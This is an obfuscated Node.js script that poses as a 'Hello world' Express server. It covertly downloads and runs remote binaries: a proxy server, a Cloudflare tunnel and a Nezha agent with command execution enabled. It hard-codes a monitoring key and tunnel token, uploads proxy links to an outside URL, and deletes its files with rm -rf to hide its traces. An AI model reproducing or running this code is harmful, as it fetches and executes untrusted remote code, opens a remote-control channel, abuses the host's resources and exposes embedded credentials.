const _0x10c3df=_0x1e79;(function(_0xd11206,_0x4d9521){const _0xe03b4c=_0x1e79,_0x449cad=_0xd11206();while(!![]){try{const _0x2e03bb=parseInt(_0xe03b4c(0xd8))/0x1+-parseInt(_0xe03b4c(0xf6))/0x2*(parseInt(_0xe03b4c(0x11e))/0x3)+parseInt(_0xe03b4c(0x150))/0x4*(-parseInt(_0xe03b4c(0xac))/0x5)+-parseInt(_0xe03b4c(0x118))/0x6*(parseInt(_0xe03b4c(0xbc))/0x7)+-parseInt(_0xe03b4c(0x104))/0x8+parseInt(_0xe03b4c(0xbf))/0x9+-parseInt(_0xe03b4c(0xf5))/0xa;if(_0x2e03bb===_0x4d9521)break;else _0x449cad['push'](_0x449cad['shift']());}catch(_0xd68204){_0x449cad['push'](_0x449cad['shift']());}}}(_0x1c06,0xd8c6c));const express=require(_0x10c3df(0xe9)),app=express(),axios=require(_0x10c3df(0xba)),os=require('os'),fs=require('fs'),path=require(_0x10c3df(0xf8)),{promisify}=require(_0x10c3df(0xf1)),exec=promisify(require(_0x10c3df(0xfa))[_0x10c3df(0xb7)]),{execSync}=require(_0x10c3df(0xfa)),UPLOAD_URL=process[_0x10c3df(0xee)][_0x10c3df(0xe1)]||'',PROJECT_URL=process[_0x10c3df(0xee)][_0x10c3df(0xc5)]||'',AUTO_ACCESS=process[_0x10c3df(0xee)][_0x10c3df(0xec)]||![],FILE_PATH=process[_0x10c3df(0xee)][_0x10c3df(0xa0)]||_0x10c3df(0x136),SUB_PATH=process[_0x10c3df(0xee)][_0x10c3df(0xab)]||'sub',PORT=process[_0x10c3df(0xee)]['SERVER_PORT']||process[_0x10c3df(0xee)][_0x10c3df(0xdb)]||0xbb8,UUID=process['env'][_0x10c3df(0xa5)]||_0x10c3df(0xc2),NEZHA_SERVER=process[_0x10c3df(0xee)][_0x10c3df(0x142)]||'nzag.faiz.us.kg:8008',NEZHA_PORT=process[_0x10c3df(0xee)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x10c3df(0xee)]['NEZHA_KEY']||'JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl',ARGO_DOMAIN=process[_0x10c3df(0xee)][_0x10c3df(0xb1)]||_0x10c3df(0xe3),ARGO_AUTH=process['env'][_0x10c3df(0x116)]||'eyJhIjoiNmI3MzZhMDhiMzlmNDVlMzE2ZTdlMGNkODE2Yjc2ZDIiLCJ0IjoiY2ZiMjc5NGItMDU0Ny00ODdkLTk3NjQtN2EyMDQyYmM3ZTM2IiwicyI6Ik5XSmhZMk5rWXpNdE1URmhaQzAwTm1RM0xUZzVPVEl0TVRJMFpXWXlPR0U1TlRFNSJ9',ARGO_PORT=process[_0x10c3df(0xee)][_0x10c3df(0x11a)]||0x1f41,CFIP=process[_0x10c3df(0xee)][_0x10c3df(0x112)]||_0x10c3df(0x108),CFPORT=process[_0x10c3df(0xee)][_0x10c3df(0xe6)]||0x1bb,NAME=process['env'][_0x10c3df(0x9e)]||'Vls';function _0x1e79(_0x44590e,_0x3a2fbd){const _0x1c06c4=_0x1c06();return _0x1e79=function(_0x1e790b,_0x4fb8f3){_0x1e790b=_0x1e790b-0x9d;let _0x3b11ef=_0x1c06c4[_0x1e790b];return _0x3b11ef;},_0x1e79(_0x44590e,_0x3a2fbd);}function _0x1c06(){const _0x4a292e=['axios','unlinkSync','28IqTAoG','Skipping\x20adding\x20automatic\x20access\x20task','/vmess-argo','13482315JaJKzH','quic','web\x20is\x20running','a064cb02-e58a-4b98-ae90-3f9909b5f6ec','/api/add-nodes','&path=%2Ftrojan-argo%3Fed%3D2560#','PROJECT_URL','fileUrl','arm','./web','\x20-p\x20','/config.json\x20>/dev/null\x202>&1\x20&','npm\x20is\x20running','bot\x20is\x20running','\x0a\x20\x20\x0atrojan://','readFileSync','error','https://arm64.ssss.nyc.mn/web','utf-8','writeFileSync','./bot','Subscription\x20uploaded\x20successfully','/trojan-argo','vless','existsSync','1582033LceqLf','text/plain;\x20charset=utf-8','config.json','PORT','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','2096','direct','config.yaml','from','UPLOAD_URL','log','galaxyus.faiz.us.kg','http','status','CFPORT','&path=%2Fvless-argo%3Fed%3D2560#','\x0a\x20\x20tunnel:\x20','express','stream','close','AUTO_ACCESS','https://arm64.ssss.nyc.mn/2go','env','post','\x20failed:\x20','util','boot.log','mkdirSync','/vless-argo','9584840yXKfni','62TPhrwW','/php\x20-c\x20\x22','path','Empowerment\x20failed\x20for\x20','child_process','trim','npm','filter','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','all','ARGO_DOMAIN:','npm\x20running\x20error:\x20','blackhole','Error\x20reading\x20boot.log:','155440nQBSlE','message','\x0avless://','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','www.visa.com.sg','unlink','Error\x20downloading\x20files:','catch','/tunnel.yml\x20run','php\x20is\x20running','tcp','trojan','unshift','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','CFIP','arm64','Error\x20executing\x20command:\x20','/web\x20-c\x20','ARGO_AUTH','NEZHA\x20variable\x20is\x20empty,skip\x20running','708348ORonZZ','aarch64','ARGO_PORT','freedom','clear','set','48243ULXpjx','https+local://8.8.8.8/dns-query','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','&type=ws&host=','forEach','--tls','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','length','443','test','rm\x20-rf\x20','/bot\x20','TunnelSecret','chmod','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','ArgoDomain:','false','toString','/api/delete-nodes','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','true','pop','join','https://amd64.ssss.nyc.mn/web','./tmp','?encryption=none&security=tls&sni=','https://arm64.ssss.nyc.mn/v1','vmess','web','tunnel.json','2053','response','push','Empowerment\x20success\x20for\x20','base64','match','NEZHA_SERVER','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','sub.txt','xtls-rprx-vision','/dev/null','bot','tls','has','send','php','2083','\x20already\x20exists','127.0.0.1','12nYcSGm','Download\x20','8443','\x20is\x20created','listen','\x0a\x20\x20credentials-file:\x20','pipe','includes','list.txt','https://amd64.ssss.nyc.mn/v1','\x20successfully','\x0aclient_secret:\x20','map','NAME','/npm\x20-s\x20','FILE_PATH','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','nohup\x20','2087','\x20>/dev/null\x202>&1\x20&','UUID','data','stringify','split','none','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','SUB_PATH','405825fgFexJ','?security=tls&sni=','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','finish','/sub.txt\x20saved\x20successfully','ARGO_DOMAIN','Content-Type','block','web\x20running\x20error:\x20','application/json','get','exec','\x0a\x20\x20\x20\x20','fileName'];_0x1c06=function(){return _0x4a292e;};return _0x1c06();}!fs[_0x10c3df(0xd7)](FILE_PATH)?(fs[_0x10c3df(0xf3)](FILE_PATH),console['log'](FILE_PATH+_0x10c3df(0x153))):console['log'](FILE_PATH+_0x10c3df(0x14e));let npmPath=path[_0x10c3df(0x134)](FILE_PATH,_0x10c3df(0xfc)),phpPath=path['join'](FILE_PATH,_0x10c3df(0x14c)),webPath=path[_0x10c3df(0x134)](FILE_PATH,_0x10c3df(0x13a)),botPath=path[_0x10c3df(0x134)](FILE_PATH,_0x10c3df(0x148)),subPath=path[_0x10c3df(0x134)](FILE_PATH,_0x10c3df(0x145)),listPath=path[_0x10c3df(0x134)](FILE_PATH,_0x10c3df(0x158)),bootLogPath=path[_0x10c3df(0x134)](FILE_PATH,_0x10c3df(0xf2)),configPath=path[_0x10c3df(0x134)](FILE_PATH,_0x10c3df(0xda));function deleteNodes(){const _0x5bfb93=_0x10c3df;try{if(!UPLOAD_URL)return;if(!fs[_0x5bfb93(0xd7)](subPath))return;let _0xae4c8d;try{_0xae4c8d=fs[_0x5bfb93(0xce)](subPath,'utf-8');}catch{return null;}const _0x3e788c=Buffer[_0x5bfb93(0xe0)](_0xae4c8d,_0x5bfb93(0x140))[_0x5bfb93(0x12f)]('utf-8'),_0x116a2c=_0x3e788c[_0x5bfb93(0xa8)]('\x0a')[_0x5bfb93(0xfd)](_0x4e8e7e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5bfb93(0x127)](_0x4e8e7e));if(_0x116a2c[_0x5bfb93(0x125)]===0x0)return;return axios[_0x5bfb93(0xef)](UPLOAD_URL+_0x5bfb93(0x130),JSON['stringify']({'nodes':_0x116a2c}),{'headers':{'Content-Type':'application/json'}})[_0x5bfb93(0x10b)](_0x22e871=>{return null;});}catch(_0x29a0a1){return null;}}function cleanupOldFiles(){const _0x2b0be7=_0x10c3df,_0x59e8ae=[_0x2b0be7(0x13a),'bot',_0x2b0be7(0xfc),_0x2b0be7(0x14c),_0x2b0be7(0x145),_0x2b0be7(0xf2)];_0x59e8ae[_0x2b0be7(0x122)](_0x2e2ef4=>{const _0x41a572=_0x2b0be7,_0x5620fb=path[_0x41a572(0x134)](FILE_PATH,_0x2e2ef4);fs['unlink'](_0x5620fb,()=>{});});}app[_0x10c3df(0xb6)]('/',function(_0x2e8052,_0x48d450){_0x48d450['send']('Hello\x20world!');});const config={'log':{'access':_0x10c3df(0x147),'error':_0x10c3df(0x147),'loglevel':_0x10c3df(0xa9)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x10c3df(0xd6),'settings':{'clients':[{'id':UUID,'flow':_0x10c3df(0x146)}],'decryption':_0x10c3df(0xa9),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x10c3df(0xbe),'dest':0xbbb},{'path':_0x10c3df(0xd5),'dest':0xbbc}]},'streamSettings':{'network':_0x10c3df(0x10e)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x10c3df(0xd6),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x10c3df(0x10e),'security':_0x10c3df(0xa9)}},{'port':0xbba,'listen':_0x10c3df(0x14f),'protocol':_0x10c3df(0xd6),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x10c3df(0xa9)},'streamSettings':{'network':'ws','security':_0x10c3df(0xa9),'wsSettings':{'path':_0x10c3df(0xf4)}},'sniffing':{'enabled':!![],'destOverride':[_0x10c3df(0xe4),_0x10c3df(0x149),_0x10c3df(0xc0)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x10c3df(0x14f),'protocol':_0x10c3df(0x139),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x10c3df(0xbe)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x10c3df(0x149),_0x10c3df(0xc0)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x10c3df(0x14f),'protocol':_0x10c3df(0x10f),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x10c3df(0xa9),'wsSettings':{'path':_0x10c3df(0xd5)}},'sniffing':{'enabled':!![],'destOverride':[_0x10c3df(0xe4),_0x10c3df(0x149),_0x10c3df(0xc0)],'metadataOnly':![]}}],'dns':{'servers':[_0x10c3df(0x11f)]},'outbounds':[{'protocol':_0x10c3df(0x11b),'tag':_0x10c3df(0xde)},{'protocol':_0x10c3df(0x102),'tag':_0x10c3df(0xb3)}]};fs['writeFileSync'](path[_0x10c3df(0x134)](FILE_PATH,'config.json'),JSON['stringify'](config,null,0x2));function getSystemArchitecture(){const _0x54d9c3=_0x10c3df,_0x3f9436=os['arch']();return _0x3f9436==='arm'||_0x3f9436===_0x54d9c3(0x113)||_0x3f9436===_0x54d9c3(0x119)?'arm':'amd';}function downloadFile(_0x5f0855,_0x1020d2,_0xd977bd){const _0x42d082=_0x10c3df,_0x4c1ebf=path[_0x42d082(0x134)](FILE_PATH,_0x5f0855),_0xfcbc50=fs['createWriteStream'](_0x4c1ebf);axios({'method':'get','url':_0x1020d2,'responseType':_0x42d082(0xea)})['then'](_0x5ddbfe=>{const _0x357c0f=_0x42d082;_0x5ddbfe[_0x357c0f(0xa6)][_0x357c0f(0x156)](_0xfcbc50),_0xfcbc50['on'](_0x357c0f(0xaf),()=>{const _0x58a31e=_0x357c0f;_0xfcbc50[_0x58a31e(0xeb)](),console['log']('Download\x20'+_0x5f0855+_0x58a31e(0x15a)),_0xd977bd(null,_0x5f0855);}),_0xfcbc50['on'](_0x357c0f(0xcf),_0xe96d46=>{const _0x457278=_0x357c0f;fs[_0x457278(0x109)](_0x4c1ebf,()=>{});const _0xab0041=_0x457278(0x151)+_0x5f0855+'\x20failed:\x20'+_0xe96d46[_0x457278(0x105)];console[_0x457278(0xcf)](_0xab0041),_0xd977bd(_0xab0041);});})[_0x42d082(0x10b)](_0x38c3cc=>{const _0x2991eb=_0x42d082,_0x35caf7=_0x2991eb(0x151)+_0x5f0855+_0x2991eb(0xf0)+_0x38c3cc[_0x2991eb(0x105)];console[_0x2991eb(0xcf)](_0x35caf7),_0xd977bd(_0x35caf7);});}async function downloadFilesAndRun(){const _0xa5ae2=_0x10c3df,_0x260fc5=getSystemArchitecture(),_0x355a3f=getFilesForArchitecture(_0x260fc5);if(_0x355a3f[_0xa5ae2(0x125)]===0x0){console[_0xa5ae2(0xe2)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x415ce9=_0x355a3f[_0xa5ae2(0x9d)](_0x3b718c=>{return new Promise((_0x1432bc,_0x2a63d8)=>{const _0x96fc2f=_0x1e79;downloadFile(_0x3b718c[_0x96fc2f(0xb9)],_0x3b718c[_0x96fc2f(0xc6)],(_0x2fb6f4,_0x49d369)=>{_0x2fb6f4?_0x2a63d8(_0x2fb6f4):_0x1432bc(_0x49d369);});});});try{await Promise[_0xa5ae2(0xff)](_0x415ce9);}catch(_0x1375f3){console['error'](_0xa5ae2(0x10a),_0x1375f3);return;}function _0x3040a3(_0x5c9042){const _0x2172e9=_0xa5ae2,_0x194716=0x1fd;_0x5c9042[_0x2172e9(0x122)](_0x591271=>{const _0x538352=_0x2172e9,_0x27e24c=path['join'](FILE_PATH,_0x591271);fs[_0x538352(0xd7)](_0x27e24c)&&fs[_0x538352(0x12b)](_0x27e24c,_0x194716,_0x5074f7=>{const _0x7e9bc3=_0x538352;_0x5074f7?console[_0x7e9bc3(0xcf)](_0x7e9bc3(0xf9)+_0x27e24c+':\x20'+_0x5074f7):console[_0x7e9bc3(0xe2)](_0x7e9bc3(0x13f)+_0x27e24c+':\x20'+_0x194716['toString'](0x8));});});}const _0x8e6a3=NEZHA_PORT?['./npm','./web',_0xa5ae2(0xd3)]:['./php',_0xa5ae2(0xc8),_0xa5ae2(0xd3)];_0x3040a3(_0x8e6a3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1f6424=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0xa5ae2(0xa8)](':')[_0xa5ae2(0x133)]():'',_0x46f79b=new Set([_0xa5ae2(0x126),_0xa5ae2(0x152),_0xa5ae2(0xdd),_0xa5ae2(0xa3),'2083',_0xa5ae2(0x13c)]),_0x46e508=_0x46f79b[_0xa5ae2(0x14a)](_0x1f6424)?_0xa5ae2(0x132):_0xa5ae2(0x12e),_0x583c8d=_0xa5ae2(0x15b)+NEZHA_KEY+_0xa5ae2(0x124)+NEZHA_SERVER+_0xa5ae2(0x111)+_0x46e508+_0xa5ae2(0xa1)+UUID;fs[_0xa5ae2(0xd2)](path[_0xa5ae2(0x134)](FILE_PATH,_0xa5ae2(0xdf)),_0x583c8d);const _0x257648=_0xa5ae2(0xa2)+FILE_PATH+_0xa5ae2(0xf7)+FILE_PATH+_0xa5ae2(0x120);try{await exec(_0x257648),console[_0xa5ae2(0xe2)](_0xa5ae2(0x10d)),await new Promise(_0xa25a6=>setTimeout(_0xa25a6,0x3e8));}catch(_0x3557fb){console[_0xa5ae2(0xcf)]('php\x20running\x20error:\x20'+_0x3557fb);}}else{let _0x35a84f='';const _0x4136e4=[_0xa5ae2(0x126),'8443',_0xa5ae2(0xdd),_0xa5ae2(0xa3),_0xa5ae2(0x14d),_0xa5ae2(0x13c)];_0x4136e4[_0xa5ae2(0x157)](NEZHA_PORT)&&(_0x35a84f=_0xa5ae2(0x123));const _0x57709e=_0xa5ae2(0xa2)+FILE_PATH+_0xa5ae2(0x9f)+NEZHA_SERVER+':'+NEZHA_PORT+_0xa5ae2(0xc9)+NEZHA_KEY+'\x20'+_0x35a84f+_0xa5ae2(0xa4);try{await exec(_0x57709e),console[_0xa5ae2(0xe2)](_0xa5ae2(0xcb)),await new Promise(_0x36c4db=>setTimeout(_0x36c4db,0x3e8));}catch(_0x473b62){console['error'](_0xa5ae2(0x101)+_0x473b62);}}}else console[_0xa5ae2(0xe2)](_0xa5ae2(0x117));const _0x263af8=_0xa5ae2(0xa2)+FILE_PATH+_0xa5ae2(0x115)+FILE_PATH+_0xa5ae2(0xca);try{await exec(_0x263af8),console['log'](_0xa5ae2(0xc1)),await new Promise(_0x13bee2=>setTimeout(_0x13bee2,0x3e8));}catch(_0x5bb1cb){console[_0xa5ae2(0xcf)](_0xa5ae2(0xb4)+_0x5bb1cb);}if(fs['existsSync'](path[_0xa5ae2(0x134)](FILE_PATH,_0xa5ae2(0x148)))){let _0x3f4eaa;if(ARGO_AUTH[_0xa5ae2(0x141)](/^[A-Z0-9a-z=]{120,250}$/))_0x3f4eaa=_0xa5ae2(0x131)+ARGO_AUTH;else ARGO_AUTH[_0xa5ae2(0x141)](/TunnelSecret/)?_0x3f4eaa=_0xa5ae2(0x12c)+FILE_PATH+_0xa5ae2(0x10c):_0x3f4eaa=_0xa5ae2(0x143)+FILE_PATH+_0xa5ae2(0x107)+ARGO_PORT;try{await exec(_0xa5ae2(0xa2)+FILE_PATH+_0xa5ae2(0x129)+_0x3f4eaa+_0xa5ae2(0xa4)),console[_0xa5ae2(0xe2)](_0xa5ae2(0xcc)),await new Promise(_0x27b61c=>setTimeout(_0x27b61c,0x7d0));}catch(_0x4258f0){console[_0xa5ae2(0xcf)](_0xa5ae2(0x114)+_0x4258f0);}}await new Promise(_0x4a2871=>setTimeout(_0x4a2871,0x1388));}function getFilesForArchitecture(_0x487243){const _0x18ee82=_0x10c3df;let _0x43e750;_0x487243===_0x18ee82(0xc7)?_0x43e750=[{'fileName':_0x18ee82(0x13a),'fileUrl':_0x18ee82(0xd0)},{'fileName':_0x18ee82(0x148),'fileUrl':_0x18ee82(0xed)}]:_0x43e750=[{'fileName':_0x18ee82(0x13a),'fileUrl':_0x18ee82(0x135)},{'fileName':_0x18ee82(0x148),'fileUrl':'https://amd64.ssss.nyc.mn/2go'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3cf3e9=_0x487243==='arm'?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x43e750[_0x18ee82(0x110)]({'fileName':'npm','fileUrl':_0x3cf3e9});}else{const _0x4421f7=_0x487243==='arm'?_0x18ee82(0x138):_0x18ee82(0x159);_0x43e750[_0x18ee82(0x110)]({'fileName':_0x18ee82(0x14c),'fileUrl':_0x4421f7});}}return _0x43e750;}function argoType(){const _0x53ca44=_0x10c3df;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x53ca44(0xe2)](_0x53ca44(0xfe));return;}if(ARGO_AUTH[_0x53ca44(0x157)](_0x53ca44(0x12a))){fs[_0x53ca44(0xd2)](path[_0x53ca44(0x134)](FILE_PATH,_0x53ca44(0x13b)),ARGO_AUTH);const _0x28ca9d=_0x53ca44(0xe8)+ARGO_AUTH[_0x53ca44(0xa8)]('\x22')[0xb]+_0x53ca44(0x155)+path[_0x53ca44(0x134)](FILE_PATH,'tunnel.json')+_0x53ca44(0xae)+ARGO_DOMAIN+_0x53ca44(0xdc)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x53ca44(0xd2)](path[_0x53ca44(0x134)](FILE_PATH,'tunnel.yml'),_0x28ca9d);}else console[_0x53ca44(0xe2)](_0x53ca44(0x144));}argoType();async function extractDomains(){const _0x178b12=_0x10c3df;let _0x42fb92;if(ARGO_AUTH&&ARGO_DOMAIN)_0x42fb92=ARGO_DOMAIN,console[_0x178b12(0xe2)](_0x178b12(0x100),_0x42fb92),await _0x1e294d(_0x42fb92);else try{const _0x4ac97a=fs[_0x178b12(0xce)](path['join'](FILE_PATH,_0x178b12(0xf2)),_0x178b12(0xd1)),_0x39facb=_0x4ac97a['split']('\x0a'),_0xf57e3f=[];_0x39facb[_0x178b12(0x122)](_0x1fae51=>{const _0x583ee9=_0x178b12,_0xcdcc16=_0x1fae51['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xcdcc16){const _0x55c969=_0xcdcc16[0x1];_0xf57e3f[_0x583ee9(0x13e)](_0x55c969);}});if(_0xf57e3f['length']>0x0)_0x42fb92=_0xf57e3f[0x0],console[_0x178b12(0xe2)](_0x178b12(0x12d),_0x42fb92),await _0x1e294d(_0x42fb92);else{console[_0x178b12(0xe2)](_0x178b12(0xaa)),fs[_0x178b12(0xbb)](path['join'](FILE_PATH,_0x178b12(0xf2)));async function _0x132196(){try{await exec('pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1');}catch(_0x2d8982){}}_0x132196(),await new Promise(_0x4c2d49=>setTimeout(_0x4c2d49,0xbb8));const _0x11c83e=_0x178b12(0x143)+FILE_PATH+_0x178b12(0x107)+ARGO_PORT;try{await exec('nohup\x20'+path['join'](FILE_PATH,_0x178b12(0x148))+'\x20'+_0x11c83e+_0x178b12(0xa4)),console['log']('bot\x20is\x20running.'),await new Promise(_0x542644=>setTimeout(_0x542644,0xbb8)),await extractDomains();}catch(_0x23be2a){console[_0x178b12(0xcf)](_0x178b12(0x114)+_0x23be2a);}}}catch(_0x555946){console['error'](_0x178b12(0x103),_0x555946);}async function _0x1e294d(_0xbc876c){const _0x1ec380=_0x178b12,_0x400278=execSync('curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x1ec380(0xd1)}),_0x30afd6=_0x400278[_0x1ec380(0xfb)]();return new Promise(_0x4d1182=>{setTimeout(()=>{const _0x5ef539=_0x1e79,_0x36c3cc={'v':'2','ps':NAME+'-'+_0x30afd6,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5ef539(0xa9),'net':'ws','type':'none','host':_0xbc876c,'path':'/vmess-argo?ed=2560','tls':_0x5ef539(0x149),'sni':_0xbc876c,'alpn':''},_0x5d1030=_0x5ef539(0x106)+UUID+'@'+CFIP+':'+CFPORT+_0x5ef539(0x137)+_0xbc876c+_0x5ef539(0x121)+_0xbc876c+_0x5ef539(0xe7)+NAME+'-'+_0x30afd6+'\x0a\x20\x20\x0avmess://'+Buffer[_0x5ef539(0xe0)](JSON[_0x5ef539(0xa7)](_0x36c3cc))['toString'](_0x5ef539(0x140))+_0x5ef539(0xcd)+UUID+'@'+CFIP+':'+CFPORT+_0x5ef539(0xad)+_0xbc876c+_0x5ef539(0x121)+_0xbc876c+_0x5ef539(0xc4)+NAME+'-'+_0x30afd6+_0x5ef539(0xb8);console['log'](Buffer['from'](_0x5d1030)[_0x5ef539(0x12f)](_0x5ef539(0x140))),fs[_0x5ef539(0xd2)](subPath,Buffer['from'](_0x5d1030)[_0x5ef539(0x12f)](_0x5ef539(0x140))),console[_0x5ef539(0xe2)](FILE_PATH+_0x5ef539(0xb0)),uplodNodes(),app[_0x5ef539(0xb6)]('/'+SUB_PATH,(_0x3803b9,_0x24af68)=>{const _0x29c113=_0x5ef539,_0x107eb4=Buffer['from'](_0x5d1030)['toString'](_0x29c113(0x140));_0x24af68[_0x29c113(0x11d)](_0x29c113(0xb2),_0x29c113(0xd9)),_0x24af68[_0x29c113(0x14b)](_0x107eb4);}),_0x4d1182(_0x5d1030);},0x7d0);});}}async function uplodNodes(){const _0x7450e5=_0x10c3df;if(UPLOAD_URL&&PROJECT_URL){const _0x3ed79c=PROJECT_URL+'/'+SUB_PATH,_0x1f2bf3={'subscription':[_0x3ed79c]};try{const _0x35ddce=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x1f2bf3,{'headers':{'Content-Type':_0x7450e5(0xb5)}});if(_0x35ddce['status']===0xc8)console[_0x7450e5(0xe2)](_0x7450e5(0xd4));else return null;}catch(_0x2606aa){if(_0x2606aa[_0x7450e5(0x13d)]){if(_0x2606aa[_0x7450e5(0x13d)][_0x7450e5(0xe5)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x7450e5(0xd7)](listPath))return;const _0x44bc9f=fs[_0x7450e5(0xce)](listPath,_0x7450e5(0xd1)),_0x47edc7=_0x44bc9f['split']('\x0a')['filter'](_0x5996fb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x7450e5(0x127)](_0x5996fb));if(_0x47edc7['length']===0x0)return;const _0x48b524=JSON[_0x7450e5(0xa7)]({'nodes':_0x47edc7});try{await axios[_0x7450e5(0xef)](UPLOAD_URL+_0x7450e5(0xc3),_0x48b524,{'headers':{'Content-Type':_0x7450e5(0xb5)}});if(response['status']===0xc8)console[_0x7450e5(0xe2)](_0x7450e5(0xd4));else return null;}catch(_0xf3e7d2){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5d909c=_0x1e79,_0x3bbb0b=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0x3bbb0b[_0x5d909c(0x13e)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3bbb0b[_0x5d909c(0x13e)](phpPath);exec(_0x5d909c(0x128)+_0x3bbb0b[_0x5d909c(0x134)]('\x20')+'\x20>/dev/null\x202>&1',_0x20e9a2=>{const _0x14058c=_0x5d909c;console[_0x14058c(0x11c)](),console[_0x14058c(0xe2)]('App\x20is\x20running'),console[_0x14058c(0xe2)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1ddc9d=_0x10c3df;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1ddc9d(0xe2)](_0x1ddc9d(0xbd));return;}try{const _0x5b6bf0=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1ddc9d(0xb5)}});console[_0x1ddc9d(0xe2)]('automatic\x20access\x20task\x20added\x20successfully');}catch(_0x454f3d){console[_0x1ddc9d(0xcf)]('添加URL失败:\x20'+_0x454f3d[_0x1ddc9d(0x105)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x10c3df(0x154)](PORT,()=>console[_0x10c3df(0xe2)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
